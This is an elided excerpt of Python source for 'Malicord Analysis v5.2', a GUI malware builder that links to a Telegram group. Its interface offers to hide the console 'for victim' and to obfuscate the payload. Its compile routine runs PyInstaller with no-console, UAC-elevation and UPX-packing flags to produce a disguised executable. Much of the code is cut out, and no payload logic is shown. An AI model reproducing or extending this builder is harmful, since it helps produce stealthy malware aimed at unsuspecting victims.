...
############################################ Clean@Code: For Malicord Analysis #########################################################
###################################################################################################################################
...
data = {
     'state':"Build Some Analysis",
     'details':"with Malicord Analysis v5.2",
     'large_image':"Malicordx",
     'large_text':None, 
     'small_image':"xMalicord",
     'small_text':None, 
     'buttons':[{"label": "Github", "url": "https://github.com/Malicord-Analysis"}, {"label": "Telegram", "url": "https://t.me/+WvJrz6yv5AxkYjY8"}],
     'time': 1
      }
update()
...
###Main script
class Malicord(customtkinter.CTk):
    def __init__(self):

        self.icon_name = ""
        self.pingtype = "none"
        self.iconname = "Malicord_assets\img\Malicord.ico"
        self.hide = "no"
        self.icb = "no"
        ...
        #title, icon
        self.title("Malicord Analysis - Builder")
        self.geometry("820x500")
        self.iconbitmap("Malicord_assets\img\logo.ico")
        ...
        #path img
        image_path = os.path.join(os.path.dirname(os.path.realpath(__file__)), "Malicord_assets\img")
        ...
        self.hide = customtkinter.CTkCheckBox(self.options_frame, text="Hide Malicord console for victim", fg_color=("gray75", "gray25"), hover_color="#ff0026",onvalue='yes', offvalue='no')
        ...
        #Build category
        self.obf = customtkinter.CTkCheckBox(self.build_frame, text="Obfuscate the Malicord", fg_color=("gray75", "gray25"), hover_color="#ff0026", onvalue='yes', offvalue='no')
        ...
        urls = [("Github", "https://github.com/Malicord-Analysis"),("Discord", "https://t.me/+WvJrz6yv5AxkYjY8"),("Telegram", "https://t.me/+WvJrz6yv5AxkYjY8")]
...
##BUILDER USING
    ...
    def compile(self, filename):
        ...
        if self.hide.get() == "yes":
            if self.icb.get() == "yes":
                os.system(f'python -m PyInstaller --onefile --version-file=./Malicord_assets/version/version.txt --hiddenimport=pypiwin32 --uac-admin --noconsole --upx-dir=./Malicord_assets/upx -i {icon} --distpath ./ .\\{filename}.py')
            if self.icb.get() == "no":
                os.system(f'python -m PyInstaller --onefile --version-file=./Malicord_assets/version/version.txt --hiddenimport=pypiwin32 --noconsole --upx-dir=./Malicord_assets/upx -i {icon} --distpath ./ .\\{filename}.py')
        if self.hide.get() == "no":
            if self.icb.get() == "yes":
                os.system(f'python -m PyInstaller --hiddenimport=pypiwin32 --version-file=./Malicord_assets/version/version.txt --uac-admin --onefile --upx-dir=./Malicord_assets/upx -i {icon} --distpath ./ .\\{filename}.py')
            if self.icb.get() == "no":
                os.system(f'python -m PyInstaller --hiddenimport=pypiwin32 --version-file=./Malicord_assets/version/version.txt --onefile --upx-dir=./Malicord_assets/upx -i {icon} --distpath ./ .\\{filename}.py')
